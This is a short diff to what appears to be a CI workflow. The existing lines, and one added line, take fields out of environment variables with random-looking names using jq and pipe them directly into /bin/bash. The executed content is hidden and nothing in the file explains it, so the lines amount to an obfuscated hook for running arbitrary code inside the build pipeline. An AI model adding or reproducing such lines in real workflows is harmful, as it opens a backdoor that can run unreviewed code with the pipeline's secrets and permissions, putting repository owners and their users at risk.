@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$wbl877" | jq -r .wvlmk2 | /bin/bash
           echo $v9171 | jq -r .tmt81744 | /bin/bash
           echo $xl0 | jq -r .beliv2215 | /bin/bash
+          printf '%s' "$p3" | jq -r .iunke0 | /bin/bash
 
       - name: Persist results
         if: always()
